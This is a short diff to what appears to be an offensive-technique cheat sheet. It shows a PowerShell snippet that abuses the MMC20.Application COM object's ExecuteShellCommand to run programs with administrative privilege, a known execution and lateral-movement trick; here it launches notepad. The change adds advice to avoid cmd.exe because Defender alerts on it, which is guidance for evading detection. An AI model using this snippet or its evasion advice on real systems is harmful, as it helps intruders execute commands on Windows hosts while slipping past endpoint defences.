@@ -27,7 +27,7 @@ lua file content
  ````
 ### MMC
 ````
-**Required powershell with administrative privilege.**
+**Required powershell with administrative privilege.** Avoid opening cmd.exe as it gets alerted in Defender.
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application"))
 $com.Document.ActiveView.ExecuteShellCommand("C:\windows\system32\notepad.exe",$null,$null,"7")
  ````
